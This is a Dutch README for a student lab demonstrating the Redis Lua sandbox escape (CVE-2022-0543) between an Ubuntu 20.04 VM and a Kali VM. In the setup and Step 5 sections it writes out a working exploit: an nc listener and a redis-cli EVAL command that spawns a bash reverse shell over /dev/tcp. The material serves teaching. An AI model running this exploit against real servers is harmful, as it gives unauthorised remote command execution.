# CyberSecurity_NPE

Binnen deze repositorie zullen wij werken aan een proof of concept voor het vak Cyber security en virtualisatie. Deze proof of concept zal gaan over de redis sandbox escape vulnerability (CVE-2022-0543). In dit bestand zullen we vooral informatie zetten over de vulnerability en hoe wij deze wensen te demonstreren. 

## Uitleg 

Redis is een databank die informatie zal opslaan op het RAM geheugen, wat het veel sneller maakt maar ook heel duur. Het nut van Redis zit vooral in de snelheid ervan. Veel applicaties gebruiken het als "cache" waarin ze veel gebruikte informatie bijhouden zodat de applicatie sneller werkt. Een voorbeeld hiervan is je winkelmandje binnen een webshop. 

Sinds versie 2.6 van Redis kunnen gebruikers scripts direct op de server uitvoeren om complexe bewerkingen sneller te maken. Dit gebeurt aan de hand van lua scripts, waarbij deze scripts bepaalde lua bilbiotheken kunnen bereiken om commandos uit te voeren. Voorbeelden van deze bilbiotheken zijn "math" en "table". Dit maakt het makkelijker voor gebruikers om data vanuit de redis databank te gebruiken en op te vragen, zonder 10 keer opnieuw aanvragen te sturen naar de server. 

Om dit te beveiligen, maakt Redis gebruik van een sandbox omgeving. Deze sandbox omgeving zorgt ervoor dat de scripts in een veilige omgeving worden uitgevoerd en niet buiten deze sandbox kunnen. Dus niet aan bestanden/ gegevens op het systeem.

Redis bouwt normaal een lua-interpreter direct in de software zelf. Hierdoor hebben de ontwikkelaars volledige controle over wat Lua wel en niet kan. Helaas, wouden de beheerders van debian en ubuntu gebruik maken van hun albestaande Lua-bibliotheek. Ze koppelde deze dan aan redis zodat redis deze kon gebruiken. Hier bevindt zich het probleem: wanneer de Lua-bibliotheek werd gekoppold, werd een specifiek object genaamd "package" automatisch opnieuw geactiveerd. Dit package-object gaf gebruikers de mogelijkheid om externe modules en bibliotheken te laden en gebruiken, iets wat in de sandbox strikt verboden zou moeten zijn.

Omdat het package-object beschikbaar was, kon een gebruiker een Lua-script naar Redis sturen (via het EVAL commando) dat de standaard C-bibliotheek (libc) inlaadt. Zodra ze toegang hadden tot libc binnen hun script, konden ze de sandbox volledig verlaten en commando's uitvoeren op het niveau van het besturingssysteem. Voorbeelden hiervan vindt je hieronder: 

    1. Verbinding maken met de Redis-server.

    2. Een Lua-script uitvoeren dat via de package-module de functie os.execute aanroept.

    3. Remote Code Execution (RCE): De aanvaller heeft nu de volledige controle over de server.

## Onze opstelling

Wij zullen deze kwetsbaarheid demonstreren door gebruik te maken van 2 VMs: 1 Ubuntu 20.04 en 1 kali linux. We maken gebruik van Ubuntu versie 20.04 omdat hier nog de kwetsbare Lua bibliotheken op staan. Op deze ubuntu VM zullen we een kwetsbare versie van Redis installeren en configureren. Dit is namelijk versie: 5:5.0.7-2, we zullen deze versie dan ook vast zetten zodat redis niet automatisch update naar een nieuwere versie. Verder zullen we ook de protected mode van redis afzetten (Hier kan je meer informatie over vinden in "## Verduidelijkingen" onderaan dit bestand). 

Dan hebben we ook nog een kali linux waarop we 2 simpele commando's zullen uitvoeren: 

    - `nc -nvlp 4444`
    - `redis-cli -h 192.168.56.113 EVAL 'local f = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = f(); os.execute("bash -c \"bash -i >& /dev/tcp/192.168.56.114/4444 0>&1\"");' 0"`

Deze moeten uitgevoerd worden in 2 aparte terminals en in de juiste volgorde (zoals hierboven). De uitkomst van deze 2 commandos zal een reverse shell zijn, waarmee jij commando's kan uitvoeren rechtstreeks op de server. 

## Stappenplan

### Stap 1: Download ubuntu 20.04 en kali VDI

Eerst moet je een ubuntu 20.04 en kali VDI bestand downloaden. Je hebt versie 20.04 nodig omdat hier nog de kwetsbare LUA bibliotheken op staan. Je kan de ubuntu VDI dowloaden via deze link:  https://sourceforge.net/projects/osboxes/files/v/vb/55-U-u/20.04/20.04.4/64bit.7z/download en de kali VDI van deze link: https://www.kali.org/get-kali/#kali-virtual-machines

### Stap 2: uit de VDIs uit

Wanneer de VDIs gedownload zijn, zal je 2 zip files hebben. Deze moet je uitpakken naar een plaats die je kan onthouden. Je zal dan ook deze locatie moeten invullen in de variabellen in het script [VboxCreationScript.ps1](VboxCreationScript.ps1). De variabellen die je zal moeten aanpassen zijn: $SETUP_SCRIPT, $VDI_TARGET_PATH and $VDI_KALI_PATH. Doe dit zoals je hieronder ziet:
    - $SETUP_SCRIPT --> Verander je naar de locatie van het script [setup_redis.sh](./setup/setup_redis.sh)
    - $VDI_TARGET_PATH --> Verander je naar de locatie van je ubuntu 20.04 VDI bestand
    - $VDI_KALI_PATH --> Verander je naar de locatie van je kali VDI bestand

### Stap 3: voer VboxCreationScript.ps1 uit

Nu kan je het script ([VboxCreationScript.ps1](VboxCreationScript.ps1)) uitvoeren. 

### Stap 4: vind de IPs

Gebruik het commando `ip a` binnen beide VMs om het ip address van de host-only interface te vinden.

### Stap 5: voer de kali commandos uit

Ga nu in de Kali linux VM en open 2 terminals. In 1 terminal voer je het commando `nc -nvlp 4444` uit en dan in de andere `redis-cli -h [TARGET_IP] EVAL 'local f = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = f(); os.execute("bash -c \"bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1\"");' 0"`. Vervang [TARGET_IP] met het ip address van de ubuntu 20.04 VM en [ATTACKER_IP] met het ip address van de kali linux VM.

## Variables

Voor Tibo:  
    - $SETUP_SCRIPT = "C:\Users\wille\CyberSecVirt\CyberSecurity_NPE\setup\setup_redis.sh" 
    - $VDI_TARGET_PATH = "C:\Users\wille\CyberSecVirt\VDI's\64bit\Ubuntu_20.04.4.vdi" 
    - $VDI_KALI_PATH = "C:\Users\wille\CyberSecVirt\VDI's\kali-linux-2026.1-virtualbox-amd64\kali-linux-2026.1-virtualbox-amd64.vdi"

Voor Alizee:

## Verduidelijkingen

In setup_redis.sh hebben wij een lijn die zegt: "echo "$PASSWORD" | sudo -S sed -i "s/protected-mode yes/protected-mode no/" /etc/redis/redis.conf". Dit zal de protectie modus van redis afzetten. Dit is effectief de bedoeling en hoort bij onze demonstratie.Wat we proberen simuleren is een luie en slechte admin die dit op off zet om andere devices makkelijker access te geven aan de redis service. Dit komt omdat als het aan staat, dan accepteert redis enkel connecties die van de local host komen. 

Vaak maakt deze redis sandbox escape deel uit van een chain van aanvallen. Waarbij de aanvaller eerst connectie maakt met de server zelf, met vb. SSRF, en dan de redis sandbox escape kwetsbaarheid gebruikt om aan de server te geraken. Vaak wordt dit dan ook nog gevolgd door een privlidge escalatie omdat met de redis sandbox escape kwetsbaarheid gebruik jij de user die redis gebruikt (vaak redis). Deze user heeft vaak niet veel rechten of toch niet de nodige. Wat niet betekent dat je niet vanalles kan doen met deze redis gebruiker. 

## Makers

| Name               | Github                                                 |
| ------------------ | ------------------------------------------------------ |
| Tibo Willemsen     | [GH_Tibo_Willemsen](https://github.com/Tibo-Willemsen) |
| Alizee Vande Henst | [GH_Alizée_Vander_Henst](https://github.com/alizeevdh) |
